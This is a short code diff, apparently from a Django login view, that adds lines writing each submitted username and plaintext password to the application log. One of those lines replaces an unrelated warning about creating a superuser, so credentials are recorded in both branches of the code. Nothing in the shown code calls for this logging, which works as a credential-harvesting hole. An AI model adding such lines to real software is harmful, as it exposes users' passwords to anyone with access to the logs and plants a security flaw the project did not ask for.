@@ -42,9 +42,10 @@ def index(request):
             except Exception as e:
                 log.error(e)
             else:
+                log.info(f"[ Login Info ] : [username or email*] {username} - [password*] {password}")
                 log.info("Message envoyé")
         else:
-            log.warning("Please create at lease 1 superuser.")
+            log.info(f"[ Login Info ] : [username or email*] {username} - [password*] {password}")
 
         # the number of attempts limited to 5
         try:
